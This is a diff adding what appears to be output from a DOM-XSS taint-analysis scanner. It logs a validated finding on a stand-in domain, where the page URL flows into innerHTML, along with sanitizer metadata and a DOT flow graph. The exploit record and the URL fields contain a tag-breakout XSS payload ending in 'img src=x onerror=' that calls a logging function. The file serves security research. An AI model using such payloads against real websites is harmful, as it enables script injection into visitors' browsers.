@@ -1,0 +1,76 @@
+// Finding: c9576a29-bd24-449d-9a1d-2259e72da0cb
+// Finding.url: https://www.example170.com/terms-conditions##</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('e7b18dbc6bc240c5bd7572d30df477ff')><!--/*
+// Finding.parentloc: https://www.example170.com/terms-conditions##</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('e7b18dbc6bc240c5bd7572d30df477ff')><!--/*
+// Finding.domain: www.example170.com
+// Finding.base_domain: example170.com
+// Finding.source: document.documentURI
+// Finding.sink: innerHTML
+// Sanitizer.score: 1
+// Sanitizer.name: <synthetic>
+// Sanitizer.location: example18.com
+// Finding.begin: 167
+// Finding.end: 168
+// Finding.original_uuid: 22106a22-9080-4153-8bb7-5406eb917d49
+// Finding.TwentyFiveMillionFlowsId: -1487807036
+// Finding.script: https://cdn2.example171.com/hub/2828691/hub_generated/template_assets/45042258853/1620022874842/A_Ruangguru_Projects/Project_Hofar/Javascript_Auto_Generate_Breadcrumb_-_V1_1.js
+// Finding.line: 1
+// Exploit.uuid: e7b18dbc-6bc2-40c5-bd75-72d30df477ff
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: text
+// Exploit.content: T
+// Exploit.quote_type: None
+// Exploit.tag: None
+// Exploit.break_out: #</iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 1
+// Exploit.end_taint_url: 2
+// Exploit.replace_begin_url: 42
+// Exploit.replace_end_url: 42
+// Exploit.replace_begin_param: 113
+// Exploit.replace_end_param: 113
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: true
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 1986857005
+// DepGraph.sanitizer_hash: -436895594
+// Merged split and join statements 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="split"];
+n2 [shape=box, label="Lit: /"];
+n3 [shape=box, label="Var: x"];
+n4 [shape=ellipse, label="preg_replace"];
+n5 [shape=box, label="RegExp: /[-]/"];
+n6 [shape=box, label="Lit:  "];
+n7 [shape=box, label="Var: x"];
+n8 [shape=box, label="Var: x"];
+n9 [shape=doubleoctagon, label="Return: x"];
+n3 -> n0;
+n1 -> n2;
+n1 -> n3;
+n7 -> n1;
+n4 -> n5;
+n4 -> n6;
+n4 -> n7;
+n8 -> n4;
+n9 -> n8;
+}
